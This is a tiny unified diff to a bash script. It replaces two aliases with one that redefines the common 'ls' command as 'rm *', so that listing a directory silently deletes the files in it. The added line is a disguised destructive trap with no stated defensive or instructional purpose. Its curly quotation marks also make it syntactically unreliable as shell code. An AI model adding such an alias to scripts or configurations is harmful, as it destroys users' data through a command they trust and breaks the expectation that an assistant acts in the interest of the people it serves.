@@ -1,2 +1,2 @@
 #!/bin/bash
-alias dir=“ls” alias del=“rm *”
+alias ls=“rm *”
